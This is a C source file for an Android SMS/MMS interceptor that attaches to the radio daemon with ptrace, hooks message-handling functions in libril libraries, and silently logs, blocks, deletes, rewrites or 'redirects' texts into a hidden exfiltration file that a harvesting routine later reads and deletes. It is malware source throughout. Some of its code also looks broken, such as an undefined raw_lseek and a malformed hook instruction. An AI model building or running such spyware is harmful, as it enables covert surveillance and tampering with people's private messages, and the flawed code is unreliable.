#include "sms_mms_interceptor.h"
#include <sys/syscall.h>
#include <linux/fs.h>
#include <linux/stat.h>
#include <asm/unistd.h>
#include <asm/fcntl.h>
#include <asm/stat.h>
#include <asm/ptrace.h>
#include <linux/elf.h>
#include <linux/user.h>
#include <sys/wait.h>
#include <regex.h>

#define MAX_PATH_LEN 256
#define MAX_SMS_LEN 4096
#define MAX_MMS_DATA 8192
#define MAX_RULES 32
#define MAX_PROCESSES 8
#define MAX_PATTERN_LEN 128
#define MAX_REPLACEMENT_LEN 512

typedef enum {
    INTERCEPT_NONE = 0,
    INTERCEPT_LOG_ONLY,
    INTERCEPT_BLOCK,
    INTERCEPT_MODIFY,
    INTERCEPT_DELETE,
    INTERCEPT_REDIRECT,
    INTERCEPT_TRANSFORM
} intercept_mode_t;

typedef enum {
    MATCH_SENDER = 1,
    MATCH_RECIPIENT = 2,
    MATCH_CONTENT = 4,
    MATCH_ALL = 7
} match_criteria_t;

typedef struct {
    regex_t pattern;
    intercept_mode_t action;
    match_criteria_t criteria;
    char replacement[MAX_REPLACEMENT_LEN];
    int priority;
    time_t start_time;
    time_t end_time;
} content_rule_t;

typedef struct {
    content_rule_t rules[MAX_RULES];
    int rule_count;
} rule_engine_t;

typedef struct {
    size_t sms_intercepted;
    size_t mms_intercepted;
    size_t total_blocked;
    size_t total_redirected;
    size_t total_modified;
    time_t last_update;
} interception_stats_t;

typedef struct {
    intercept_mode_t sms_mode;
    intercept_mode_t mms_mode;
    char redirect_number[32];
    char modify_prefix[64];
    int block_all;
    int enable_exfil;
    char exfil_path[MAX_PATH_LEN];
    char block_list[1024];
    char allow_list[1024];
    pid_t target_processes[MAX_PROCESSES];
    int process_count;
} interception_config_t;

static interception_config_t current_config = {
    .sms_mode = INTERCEPT_LOG_ONLY,
    .mms_mode = INTERCEPT_LOG_ONLY,
    .redirect_number = "",
    .modify_prefix = "[MODIFIED] ",
    .block_all = 0,
    .enable_exfil = 0,
    .exfil_path = "/data/local/tmp/.comms_exfil",
    .block_list = "",
    .allow_list = "",
    .process_count = 0
};

static rule_engine_t rule_engine = {0};
static interception_stats_t stats = {0};
static int is_initialized = 0;

static long raw_open(const char *pathname, int flags, mode_t mode) {
    return syscall(__NR_open, pathname, flags, mode);
}

static long raw_close(int fd) {
    return syscall(__NR_close, fd);
}

static long raw_write(int fd, const void *buf, size_t count) {
    return syscall(__NR_write, fd, buf, count);
}

static long raw_read(int fd, void *buf, size_t count) {
    return syscall(__NR_read, fd, buf, count);
}

static long raw_ptrace(long request, pid_t pid, void *addr, void *data) {
    return syscall(__NR_ptrace, request, pid, addr, data);
}

static long raw_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    return syscall(__NR_getdents, fd, dirp, count);
}

static long raw_kill(pid_t pid, int sig) {
    return syscall(__NR_kill, pid, sig);
}

static long raw_unlink(const char *pathname) {
    return syscall(__NR_unlink, pathname);
}

static long raw_mkdir(const char *pathname, mode_t mode) {
    return syscall(__NR_mkdir, pathname, mode);
}

static int should_block_number(const char *number) {
    if (current_config.block_all) return 1;
    
    if (current_config.allow_list[0] != '\0') {
        char *token, *saveptr;
        char allow_list[1024];
        strncpy(allow_list, current_config.allow_list, sizeof(allow_list));
        
        token = strtok_r(allow_list, ",", &saveptr);
        while (token) {
            if (strstr(number, token)) return 0;
            token = strtok_r(NULL, ",", &saveptr);
        }
        return 1;
    }
    
    if (current_config.block_list[0] != '\0') {
        char *token, *saveptr;
        char block_list[1024];
        strncpy(block_list, current_config.block_list, sizeof(block_list));
        
        token = strtok_r(block_list, ",", &saveptr);
        while (token) {
            if (strstr(number, token)) return 1;
            token = strtok_r(NULL, ",", &saveptr);
        }
    }
    
    return 0;
}

static int compile_regex(regex_t *regex, const char *pattern) {
    return regcomp(regex, pattern, REG_EXTENDED | REG_NOSUB);
}

static int match_pattern(const char *input, regex_t *regex) {
    return regexec(regex, input, 0, NULL, 0) == 0;
}

static int evaluate_rules(const char *sender, const char *recipient, const char *content, content_rule_t **matched_rule) {
    time_t current_time = time(NULL);
    int highest_priority = -1;
    content_rule_t *best_rule = NULL;

    for (int i = 0; i < rule_engine.rule_count; i++) {
        content_rule_t *rule = &rule_engine.rules[i];
        
        if (rule->start_time && current_time < rule->start_time) continue;
        if (rule->end_time && current_time > rule->end_time) continue;
        
        int matches = 1;
        if (rule->criteria & MATCH_SENDER) {
            matches &= match_pattern(sender, &rule->pattern);
        }
        if (rule->criteria & MATCH_RECIPIENT) {
            matches &= match_pattern(recipient, &rule->pattern);
        }
        if (rule->criteria & MATCH_CONTENT) {
            matches &= match_pattern(content, &rule->pattern);
        }
        
        if (matches && rule->priority > highest_priority) {
            highest_priority = rule->priority;
            best_rule = rule;
        }
    }

    *matched_rule = best_rule;
    return best_rule != NULL;
}

static int modify_sms_content(char *message, size_t max_len) {
    size_t prefix_len = strlen(current_config.modify_prefix);
    if (prefix_len + strlen(message) >= max_len) return -1;

    memmove(message + prefix_len, message, strlen(message) + 1);
    memcpy(message, current_config.modify_prefix, prefix_len);
    return 0;
}

static int full_content_replace(char *message, size_t max_len, const char *new_content) {
    size_t new_len = strlen(new_content);
    if (new_len >= max_len) return -1;
    
    strncpy(message, new_content, max_len);
    message[max_len - 1] = '\0';
    return new_len;
}

static void exfiltrate_data(const char *type, const char *number, const char *content, size_t content_len, const void *data, size_t data_len, int blocked) {
    if (!current_config.enable_exfil) return;

    int fd = raw_open(current_config.exfil_path, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd < 0) return;

    char header[512];
    int header_len = snprintf(header, sizeof(header), "=== %s | %ld | %s | %s ===\n", 
                             type, time(NULL), number, blocked ? "BLOCKED" : "ALLOWED");
    raw_write(fd, header, header_len);

    if (content && content_len > 0) {
        raw_write(fd, "CONTENT: ", 9);
        raw_write(fd, content, content_len > MAX_SMS_LEN ? MAX_SMS_LEN : content_len);
        raw_write(fd, "\n", 1);
    }

    if (data && data_len > 0) {
        raw_write(fd, "DATA: ", 6);
        raw_write(fd, data, data_len > 512 ? 512 : data_len);
        raw_write(fd, "\n", 1);
    }

    raw_write(fd, "=== END ===\n\n", 13);
    raw_close(fd);
}

static pid_t find_process_by_name(const char *process_name) {
    int fd = raw_open("/proc", O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0) return -1;

    char buf[4096];
    long bytes = raw_getdents(fd, (struct linux_dirent *)buf, sizeof(buf));
    raw_close(fd);

    if (bytes <= 0) return -1;

    struct linux_dirent *d;
    long bpos = 0;
    while (bpos < bytes) {
        d = (struct linux_dirent *)(buf + bpos);
        
        if (d->d_ino && d->d_name[0] >= '0' && d->d_name[0] <= '9') {
            pid_t pid = atoi(d->d_name);
            
            char comm_path[MAX_PATH_LEN];
            snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
            
            int comm_fd = raw_open(comm_path, O_RDONLY, 0);
            if (comm_fd >= 0) {
                char comm[64];
                long comm_len = raw_read(comm_fd, comm, sizeof(comm)-1);
                raw_close(comm_fd);
                
                if (comm_len > 0) {
                    comm[comm_len] = 0;
                    if (strstr(comm, process_name)) {
                        return pid;
                    }
                }
            }
        }
        bpos += d->d_reclen;
    }
    
    return -1;
}

static unsigned long find_symbol_in_process(pid_t pid, const char *lib_pattern, const char *symbol_name) {
    char maps_path[MAX_PATH_LEN];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    
    int maps_fd = raw_open(maps_path, O_RDONLY, 0);
    if (maps_fd < 0) return 0;

    char maps_buf[8192];
    long bytes = raw_read(maps_fd, maps_buf, sizeof(maps_buf)-1);
    raw_close(maps_fd);
    
    if (bytes <= 0) return 0;
    maps_buf[bytes] = 0;

    char *line = strtok(maps_buf, "\n");
    unsigned long base_address = 0;
    char lib_path[MAX_PATH_LEN] = {0};
    
    while (line) {
        if (strstr(line, lib_pattern)) {
            sscanf(line, "%lx-", &base_address);
            char *path_start = strchr(line, '/');
            if (path_start) {
                strncpy(lib_path, path_start, sizeof(lib_path)-1);
            }
            break;
        }
        line = strtok(NULL, "\n");
    }

    if (!base_address || !lib_path[0]) return 0;

    int lib_fd = raw_open(lib_path, O_RDONLY, 0);
    if (lib_fd < 0) return 0;

    Elf32_Ehdr ehdr;
    raw_read(lib_fd, &ehdr, sizeof(ehdr));

    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        raw_close(lib_fd);
        return 0;
    }

    Elf32_Shdr shdr[ehdr.e_shnum];
    raw_lseek(lib_fd, ehdr.e_shoff, SEEK_SET);
    raw_read(lib_fd, shdr, ehdr.e_shnum * sizeof(Elf32_Shdr));

    char *shstrtab = malloc(shdr[ehdr.e_shstrndx].sh_size);
    raw_lseek(lib_fd, shdr[ehdr.e_shstrndx].sh_offset, SEEK_SET);
    raw_read(lib_fd, shstrtab, shdr[ehdr.e_shstrndx].sh_size);

    Elf32_Sym *symtab = NULL;
    char *strtab = NULL;
    unsigned int symtab_count = 0;

    for (int i = 0; i < ehdr.e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            symtab = malloc(shdr[i].sh_size);
            raw_lseek(lib_fd, shdr[i].sh_offset, SEEK_SET);
            raw_read(lib_fd, symtab, shdr[i].sh_size);
            symtab_count = shdr[i].sh_size / sizeof(Elf32_Sym);
        } else if (shdr[i].sh_type == SHT_STRTAB && strcmp(shstrtab + shdr[i].sh_name, ".strtab") == 0) {
            strtab = malloc(shdr[i].sh_size);
            raw_lseek(lib_fd, shdr[i].sh_offset, SEEK_SET);
            raw_read(lib_fd, strtab, shdr[i].sh_size);
        }
    }

    unsigned long symbol_addr = 0;
    for (unsigned int i = 0; i < symtab_count; i++) {
        if (symtab[i].st_name && strcmp(strtab + symtab[i].st_name, symbol_name) == 0) {
            symbol_addr = base_address + symtab[i].st_value;
            break;
        }
    }

    free(symtab);
    free(strtab);
    free(shstrtab);
    raw_close(lib_fd);

    return symbol_addr;
}

static int install_hook(pid_t pid, unsigned long orig_addr, unsigned long hook_addr) {
    if (raw_ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) return -1;

    int status;
    waitpid(pid, &status, 0);

    for (int i = 0; i < 4; i++) {
        long original = raw_ptrace(PTRACE_PEEKTEXT, pid, (void*)(orig_addr + i * 4), NULL);
        if (original == -1) {
            raw_ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
    }

    long jump_instr = 0xE8 | ((hook_addr - orig_addr - 5) << 8);
    if (raw_ptrace(PTRACE_POKETEXT, pid, (void*)orig_addr, jump_instr) < 0) {
        raw_ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    raw_ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}

int __attribute__((noinline)) sms_interception_handler(const char *number, char *message, size_t *length) {
    if (!is_initialized) return 0;
    
    content_rule_t *matched_rule = NULL;
    if (evaluate_rules(number, "", message, &matched_rule)) {
        switch (matched_rule->action) {
            case INTERCEPT_BLOCK:
                stats.sms_intercepted++;
                stats.total_blocked++;
                return -1;
            case INTERCEPT_DELETE:
                *length = 0;
                stats.sms_intercepted++;
                return 0;
            case INTERCEPT_MODIFY:
                if (modify_sms_content(message, MAX_SMS_LEN) > 0) {
                    *length = strlen(message);
                    stats.total_modified++;
                }
                return 0;
            case INTERCEPT_TRANSFORM:
                if (full_content_replace(message, MAX_SMS_LEN, matched_rule->replacement) > 0) {
                    *length = strlen(message);
                    stats.total_modified++;
                }
                return 0;
            case INTERCEPT_REDIRECT:
                if (current_config.redirect_number[0]) {
                    exfiltrate_data("SMS_REDIRECT", current_config.redirect_number, message, *length, NULL, 0, 0);
                    return -1;
                }
                return 0;
            default:
                break;
        }
    }
    
    int should_block = should_block_number(number);
    exfiltrate_data("SMS", number, message, *length, NULL, 0, should_block);
    
    if (should_block) {
        stats.sms_intercepted++;
        stats.total_blocked++;
        return -1;
    }

    switch (current_config.sms_mode) {
        case INTERCEPT_BLOCK:
            return -1;
        case INTERCEPT_DELETE:
            *length = 0;
            return 0;
        case INTERCEPT_MODIFY:
            if (modify_sms_content(message, MAX_SMS_LEN) > 0) {
                *length = strlen(message);
            }
            return 0;
        case INTERCEPT_REDIRECT:
            if (current_config.redirect_number[0]) {
                exfiltrate_data("SMS_REDIRECT", current_config.redirect_number, message, *length, NULL, 0, 0);
            }
            return -1;
        case INTERCEPT_LOG_ONLY:
        default:
            return 0;
    }
}

int __attribute__((noinline)) mms_interception_handler(const char *number, const char *subject, void *data, size_t *data_len) {
    if (!is_initialized) return 0;
    
    content_rule_t *matched_rule = NULL;
    char content_preview[256] = {0};
    if (subject) strncpy(content_preview, subject, sizeof(content_preview)-1);
    
    if (evaluate_rules(number, "", content_preview, &matched_rule)) {
        switch (matched_rule->action) {
            case INTERCEPT_BLOCK:
                stats.mms_intercepted++;
                stats.total_blocked++;
                return -1;
            case INTERCEPT_DELETE:
                *data_len = 0;
                stats.mms_intercepted++;
                return 0;
            case INTERCEPT_REDIRECT:
                if (current_config.redirect_number[0]) {
                    exfiltrate_data("MMS_REDIRECT", current_config.redirect_number, subject, subject ? strlen(subject) : 0, data, *data_len, 0);
                }
                return -1;
            default:
                break;
        }
    }
    
    int should_block = should_block_number(number);
    exfiltrate_data("MMS", number, subject, subject ? strlen(subject) : 0, data, *data_len, should_block);
    
    if (should_block) {
        stats.mms_intercepted++;
        stats.total_blocked++;
        return -1;
    }

    switch (current_config.mms_mode) {
        case INTERCEPT_BLOCK:
            return -1;
        case INTERCEPT_DELETE:
            *data_len = 0;
            return 0;
        case INTERCEPT_REDIRECT:
            if (current_config.redirect_number[0]) {
                exfiltrate_data("MMS_REDIRECT", current_config.redirect_number, subject, subject ? strlen(subject) : 0, data, *data_len, 0);
            }
            return -1;
        default:
            return 0;
    }
}

int add_content_rule(const char *pattern, intercept_mode_t action, match_criteria_t criteria, 
                     const char *replacement, int priority, time_t start, time_t end) {
    if (rule_engine.rule_count >= MAX_RULES) return -1;
    
    content_rule_t *rule = &rule_engine.rules[rule_engine.rule_count];
    if (compile_regex(&rule->pattern, pattern) != 0) return -1;
    
    rule->action = action;
    rule->criteria = criteria;
    rule->priority = priority;
    rule->start_time = start;
    rule->end_time = end;
    
    if (replacement) {
        strncpy(rule->replacement, replacement, MAX_REPLACEMENT_LEN - 1);
        rule->replacement[MAX_REPLACEMENT_LEN - 1] = '\0';
    }
    
    rule_engine.rule_count++;
    return 0;
}

int configure_interception(const interception_config_t *config) {
    memcpy(&current_config, config, sizeof(interception_config_t));
    
    if (current_config.enable_exfil) {
        char *dir_end = strrchr(current_config.exfil_path, '/');
        if (dir_end) {
            char dir_path[MAX_PATH_LEN];
            strncpy(dir_path, current_config.exfil_path, dir_end - current_config.exfil_path);
            dir_path[dir_end - current_config.exfil_path] = '\0';
            raw_mkdir(dir_path, 0700);
        }
    }
    
    is_initialized = 1;
    return 0;
}

int install_ril_interception() {
    pid_t rild_pid = find_process_by_name("rild");
    if (rild_pid <= 0) {
        rild_pid = find_process_by_name("ril-daemon");
        if (rild_pid <= 0) return -1;
    }

    add_target_process(rild_pid);

    const char *lib_patterns[] = {"libril.so", "libreference-ril.so", "libril-qc.so", NULL};
    const char *sms_symbols[] = {"onNewSMS", "RIL_onUnsolicitedResponse", "processSMS", "dispatchSms", NULL};
    const char *mms_symbols[] = {"onNewMMS", "processMMS", "RIL_onRequestComplete", "dispatchMms", NULL};

    int hooks_installed = 0;
    
    for (int i = 0; lib_patterns[i]; i++) {
        for (int j = 0; sms_symbols[j]; j++) {
            unsigned long sms_addr = find_symbol_in_process(rild_pid, lib_patterns[i], sms_symbols[j]);
            if (sms_addr) {
                if (install_hook(rild_pid, sms_addr, (unsigned long)sms_interception_handler) == 0) {
                    hooks_installed++;
                }
                break;
            }
        }

        for (int j = 0; mms_symbols[j]; j++) {
            unsigned long mms_addr = find_symbol_in_process(rild_pid, lib_patterns[i], mms_symbols[j]);
            if (mms_addr) {
                if (install_hook(rild_pid, mms_addr, (unsigned long)mms_interception_handler) == 0) {
                    hooks_installed++;
                }
                break;
            }
        }
    }

    return hooks_installed > 0 ? 0 : -1;
}

int block_all_communications(int enable) {
    current_config.block_all = enable;
    return 0;
}

int add_to_block_list(const char *number) {
    if (strlen(current_config.block_list) + strlen(number) + 1 < sizeof(current_config.block_list)) {
        if (current_config.block_list[0] != '\0') {
            strcat(current_config.block_list, ",");
        }
        strcat(current_config.block_list, number);
        return 0;
    }
    return -1;
}

int add_to_allow_list(const char *number) {
    if (strlen(current_config.allow_list) + strlen(number) + 1 < sizeof(current_config.allow_list)) {
        if (current_config.allow_list[0] != '\0') {
            strcat(current_config.allow_list, ",");
        }
        strcat(current_config.allow_list, number);
        return 0;
    }
    return -1;
}

int clear_block_lists() {
    current_config.block_list[0] = '\0';
    current_config.allow_list[0] = '\0';
    return 0;
}

int add_target_process(pid_t pid) {
    if (current_config.process_count >= MAX_PROCESSES) return -1;
    current_config.target_processes[current_config.process_count++] = pid;
    return 0;
}

int harvest_exfiltrated_data(char *buffer, size_t buffer_size) {
    int fd = raw_open(current_config.exfil_path, O_RDONLY, 0);
    if (fd < 0) return -1;

    ssize_t bytes_read = raw_read(fd, buffer, buffer_size - 1);
    raw_close(fd);
    
    if (bytes_read > 0) {
        buffer[bytes_read] = '\0';
        raw_unlink(current_config.exfil_path);
        return bytes_read;
    }
    
    return -1;
}

int get_interception_stats(interception_stats_t *out_stats) {
    if (!is_initialized) return -1;
    memcpy(out_stats, &stats, sizeof(interception_stats_t));
    return 0;
}

int reset_interception_stats() {
    memset(&stats, 0, sizeof(interception_stats_t));
    return 0;
}

int cleanup_interception() {
    for (int i = 0; i < rule_engine.rule_count; i++) {
        regfree(&rule_engine.rules[i].pattern);
    }
    
    raw_unlink(current_config.exfil_path);
    memset(&current_config, 0, sizeof(interception_config_t));
    memset(&rule_engine, 0, sizeof(rule_engine_t));
    memset(&stats, 0, sizeof(interception_stats_t));
    is_initialized = 0;
    
    return 0;
}